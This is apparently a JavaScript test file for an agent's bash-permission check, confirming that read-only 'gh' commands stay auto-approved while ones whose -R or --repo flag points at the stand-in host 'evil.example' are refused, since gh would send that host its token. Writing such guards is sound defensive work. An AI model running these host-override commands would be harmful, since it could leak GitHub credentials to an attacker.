import assert from "node:assert/strict";
import test from "node:test";
import { isRuntimeReadOnlyBashCommand } from "../src/tool/handlers/bash-semantics.js";

test("gh read-only commands against the current or an OWNER/REPO target stay auto-approved", () => {
  for (const command of [
    "gh pr view 1",
    "gh pr view 1 -R owner/repo",
    "gh pr view 1 -Rowner/repo",
    "gh issue list --repo owner/repo",
  ]) {
    assert.equal(isRuntimeReadOnlyBashCommand(command), true, command);
  }
});

test("gh host overrides are never auto-approved, attached or not", () => {
  // 指向其它主机的 -R 会让 gh 带着该主机的令牌发请求。
  for (const command of [
    "gh pr view 1 -R evil.example/o/r",
    "gh pr view 1 -Revil.example/o/r",
    "gh pr view 1 -Rhttps://evil.example/o/r",
    "gh issue list -Revil.example/o/r",
    "gh pr view 1 --repo=https://evil.example/o/r",
  ]) {
    assert.equal(isRuntimeReadOnlyBashCommand(command), false, command);
  }
});
